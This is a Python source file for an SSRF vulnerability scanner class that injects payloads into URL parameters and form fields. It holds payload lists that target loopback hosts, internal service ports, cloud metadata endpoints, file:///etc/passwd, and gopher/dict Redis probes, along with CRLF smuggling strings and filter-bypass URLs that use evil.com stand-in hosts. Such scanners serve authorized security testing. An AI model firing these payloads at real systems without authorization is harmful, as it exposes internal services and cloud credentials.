"""SSRF (Server-Side Request Forgery) Scanner Module"""

import re
from typing import Any

import requests


class SSRFScanner:
    """Server-Side Request Forgery vulnerability scanner"""

    def __init__(self, timeout: int = 10, user_agent: str = None):
        self.timeout = timeout
        self.user_agent = user_agent or "WebCross-Scanner/1.0"

        # Internal IP ranges that indicate SSRF
        self.internal_ranges = [
            r"127\.\d{1,3}\.\d{1,3}\.\d{1,3}",
            r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}",
            r"172\.(1[6-9]|2\d|3[0-1])\.\d{1,3}\.\d{1,3}",
            r"192\.168\.\d{1,3}\.\d{1,3}",
            r"169\.254\.\d{1,3}\.\d{1,3}",
            r"0\.0\.0\.0",
        ]

        # SSRF payloads
        self.payloads = [
            # Localhost variations
            ("http://127.0.0.1/", ["localhost", "127.0.0.1"]),
            ("http://localhost/", ["localhost", "127.0.0.1"]),
            ("http://0.0.0.0/", []),
            ("http://[::1]/", []),
            ("http://0177.0.0.1/", []),  # Octal
            ("http://2130706433/", []),   # Decimal
            ("http://0x7f.0x0.0x0.0x1/", []),  # Hex
            ("http://127.1/", []),

            # Internal services
            ("http://127.0.0.1:22/", ["SSH", "OpenSSH"]),
            ("http://127.0.0.1:3306/", ["MySQL", "MariaDB"]),
            ("http://127.0.0.1:6379/", ["Redis"]),
            ("http://127.0.0.1:27017/", ["MongoDB"]),
            ("http://127.0.0.1:9200/", ["Elasticsearch"]),

            # Cloud metadata endpoints
            ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "meta-data"]),
            ("http://169.254.169.254/computeMetadata/v1/", ["instance", "project"]),
            ("http://metadata.google.internal/computeMetadata/v1/", ["instance", "project"]),
            ("http://100.100.100.200/latest/meta-data/", []),  # Alibaba Cloud

            # URL schemes
            ("file:///etc/passwd", ["root:", "nobody:"]),
            ("file:///c:/windows/win.ini", ["[fonts]"]),
            ("dict://127.0.0.1:6379/info", ["redis"]),
            ("gopher://127.0.0.1:6379/_INFO", []),
        ]

        # Protocol smuggling payloads
        self.smuggling_payloads = [
            "http://127.0.0.1:80\r\nHost: internal.server",
            "http://127.0.0.1:80%0d%0aHost:internal.server",
        ]

        # Bypass techniques
        self.bypass_payloads = [
            # DNS rebinding
            "http://localtest.me/",
            "http://127.0.0.1.nip.io/",
            "http://spoofed.burpcollaborator.net/",

            # URL encoding bypass
            "http://127.0.0.1%23@evil.com/",
            "http://evil.com@127.0.0.1/",
            "http://127.0.0.1#@evil.com/",

            # Redirect bypass
            "http://evil.com/redirect?url=http://127.0.0.1/",
        ]

    def _make_request(self, url: str, params: dict = None) -> requests.Response | None:
        try:
            headers = {"User-Agent": self.user_agent}
            return requests.get(url, params=params, headers=headers,
                              timeout=self.timeout, verify=False, allow_redirects=False)
        except Exception:
            return None

    def _check_ssrf_response(self, response: requests.Response,
                             payload: str, markers: list[str]) -> dict | None:
        """Check for SSRF indicators in response"""
        if not response:
            return None

        content = response.text

        # Check for expected markers
        for marker in markers:
            if marker.lower() in content.lower():
                return {
                    "type": "SSRF",
                    "payload": payload,
                    "evidence": f"Internal content detected: {marker}",
                    "confidence": "HIGH"
                }

        # Check for internal IP patterns
        for pattern in self.internal_ranges:
            if re.search(pattern, content):
                return {
                    "type": "SSRF",
                    "payload": payload,
                    "evidence": "Internal IP address in response",
                    "confidence": "MEDIUM"
                }

        # Check for connection refused/timeout errors that indicate internal probing
        error_patterns = [
            "connection refused",
            "connection timed out",
            "couldn't connect to host",
            "failed to connect",
            "no route to host",
        ]

        for pattern in error_patterns:
            if pattern in content.lower():
                return {
                    "type": "SSRF_BLIND",
                    "payload": payload,
                    "evidence": f"Connection error suggests internal probing: {pattern}",
                    "confidence": "LOW"
                }

        return None

    def _check_response_diff(self, original_response: requests.Response,
                            test_response: requests.Response, payload: str) -> dict | None:
        """Compare responses to detect SSRF"""
        if not original_response or not test_response:
            return None

        # Different status codes might indicate SSRF
        if original_response.status_code != test_response.status_code:
            return {
                "type": "SSRF_STATUS_DIFF",
                "payload": payload,
                "evidence": f"Status changed: {original_response.status_code} -> {test_response.status_code}",
                "confidence": "MEDIUM"
            }

        # Significant content length difference
        orig_len = len(original_response.text)
        test_len = len(test_response.text)

        if abs(orig_len - test_len) > 500:
            return {
                "type": "SSRF_CONTENT_DIFF",
                "payload": payload,
                "evidence": f"Response length changed: {orig_len} -> {test_len}",
                "confidence": "LOW"
            }

        return None

    def scan_url(self, url: str) -> list[dict[str, Any]]:
        """Scan URL for SSRF vulnerabilities"""
        findings = []
        from urllib.parse import parse_qs, urlencode, urlparse

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return findings

        # Get original response
        original_response = self._make_request(url)

        # Look for URL-related parameters
        url_params = []
        for param in params:
            param_lower = param.lower()
            if any(kw in param_lower for kw in ['url', 'uri', 'path', 'link', 'src',
                                                  'href', 'dest', 'redirect', 'target',
                                                  'fetch', 'file', 'load', 'request',
                                                  'callback', 'proxy', 'domain', 'host']):
                url_params.append(param)

        test_params_list = url_params if url_params else list(params.keys())

        for param in test_params_list:
            for payload, markers in self.payloads[:10]:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                response = self._make_request(test_url)

                # Check response content
                result = self._check_ssrf_response(response, payload, markers)
                if result:
                    result["parameter"] = param
                    result["url"] = url
                    findings.append(result)
                    break

                # Check response differences
                result = self._check_response_diff(original_response, response, payload)
                if result:
                    result["parameter"] = param
                    result["url"] = url
                    findings.append(result)

        return findings

    def scan_form(self, url: str, form: dict) -> list[dict[str, Any]]:
        """Scan form for SSRF"""
        findings = []
        action = form.get('action', url)
        method = form.get('method', 'GET').upper()
        inputs = form.get('inputs', {})

        for field in inputs:
            for payload, markers in self.payloads[:5]:
                test_data = inputs.copy()
                test_data[field] = payload

                try:
                    headers = {"User-Agent": self.user_agent}
                    if method == "GET":
                        response = requests.get(action, params=test_data,
                                              headers=headers, timeout=self.timeout, verify=False)
                    else:
                        response = requests.post(action, data=test_data,
                                               headers=headers, timeout=self.timeout, verify=False)

                    result = self._check_ssrf_response(response, payload, markers)
                    if result:
                        result["parameter"] = field
                        result["url"] = action
                        result["method"] = method
                        findings.append(result)
                        break
                except Exception:
                    pass

        return findings
